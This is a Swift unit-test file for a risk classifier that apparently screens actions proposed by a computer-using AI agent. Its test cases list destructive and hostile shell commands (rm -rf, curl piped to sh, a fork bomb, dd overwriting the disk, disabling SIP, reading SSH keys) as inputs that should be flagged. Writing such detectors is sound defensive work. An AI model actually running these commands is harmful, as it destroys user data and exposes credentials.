import XCTest
import CoPartnerCore
import ActionExecutor

/// 風險分級 + 危險指令偵測（step 50，威脅模型 §5 / I2/I3）。偵測保守偏殺。
final class RiskClassifierTests: XCTestCase {
    private let classifier = RiskClassifier()
    private let detector = DangerousCommandDetector()

    private func risk(_ argv: [String]) -> ActionRisk {
        classifier.classify(ProposedAction(kind: .shell(argv: argv)))
    }

    func testRmRfVariantsDetected() {
        XCTAssertEqual(risk(["rm", "-rf", "build"]), .high)
        XCTAssertEqual(risk(["rm", "-r", "-f", "build"]), .high)
        XCTAssertEqual(risk(["rm", "--recursive", "--force", "x"]), .high)
        XCTAssertEqual(risk(["rm", "-fr", "x"]), .high)
        XCTAssertEqual(risk(["rm", "-r", "~"]), .high)          // 目標為家目錄
        XCTAssertEqual(risk(["/bin/rm", "-rf", "x"]), .high)    // 絕對路徑也抓
    }

    func testPlainShellDefaultsMedium() {
        XCTAssertEqual(risk(["ls", "-la"]), .medium)            // shell 永不 low
        XCTAssertEqual(risk(["rm", "file.txt"]), .medium)       // 非遞迴刪單檔
    }

    func testSudoAndPrivilegeEscalation() {
        XCTAssertEqual(risk(["sudo", "ls"]), .high)
        XCTAssertEqual(risk(["su", "-"]), .high)
        XCTAssertEqual(risk(["csrutil", "disable"]), .high)
        XCTAssertEqual(risk(["osascript", "-e", "x"]), .high)
    }

    func testPipeToShellDetected() {
        XCTAssertEqual(risk(["curl", "https://x.sh", "|", "sh"]), .high)
        XCTAssertEqual(risk(["wget", "-qO-", "u", "|", "bash"]), .high)
        XCTAssertEqual(risk(["bash", "-c", "anything"]), .high)
    }

    func testForcePushAndHardReset() {
        XCTAssertEqual(risk(["git", "push", "-f", "origin", "main"]), .high)
        XCTAssertEqual(risk(["git", "push", "--force"]), .high)
        XCTAssertEqual(risk(["git", "reset", "--hard", "HEAD~3"]), .high)
        XCTAssertEqual(risk(["git", "clean", "-fdx"]), .high)
        XCTAssertEqual(risk(["git", "status"]), .medium)        // 一般 git 是普通 shell
    }

    func testDdAndForkBomb() {
        XCTAssertEqual(risk(["dd", "if=/dev/zero", "of=/dev/disk0"]), .high)
        XCTAssertEqual(risk([":(){ :|:& };:"]), .high)
        XCTAssertEqual(risk(["defaults", "write", "com.apple.x", "y"]), .high)
    }

    func testSecretPathsReadOrWriteHigh() {
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .readFile(path: "~/.ssh/id_rsa"))), .high)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .writeFile(path: "/Users/x/Library/Keychains/db", contents: ""))), .high)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .readFile(path: "/proj/prod.env"))), .high)
        XCTAssertEqual(risk(["cat", "~/.ssh/id_rsa"]), .high)   // argv 內秘密路徑也抓
    }

    func testOutboundCommsAlwaysHigh() {
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .outboundComms(kind: "email", target: "a@b.c"))), .high)
    }

    func testUIActionsDefaultLow() {
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .click(x: 1, y: 2))), .low)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .screenshot)), .low)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .typeText("hello"))), .low)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .scroll(x: 1, y: 2, dx: 0, dy: 5))), .low)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .keypress("cmd+s"))), .medium)  // chord 保守
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .readFile(path: "/tmp/a.txt"))), .low)
        XCTAssertEqual(classifier.classify(ProposedAction(kind: .writeFile(path: "/tmp/a.txt", contents: "x"))), .medium)
    }

    func testHighReasonIsHumanReadable() {
        let a = ProposedAction(kind: .shell(argv: ["sudo", "rm"]))
        XCTAssertNotNil(classifier.reasonForHigh(a))
        XCTAssertNil(classifier.reasonForHigh(ProposedAction(kind: .click(x: 1, y: 1))))
    }

    func testBenignCommandsNotFlagged() {
        XCTAssertNil(detector.reason(argv: ["swift", "build"]))
        XCTAssertNil(detector.reason(argv: ["git", "commit", "-m", "msg"]))
        XCTAssertNil(detector.reason(argv: ["echo", "hello"]))
    }
}
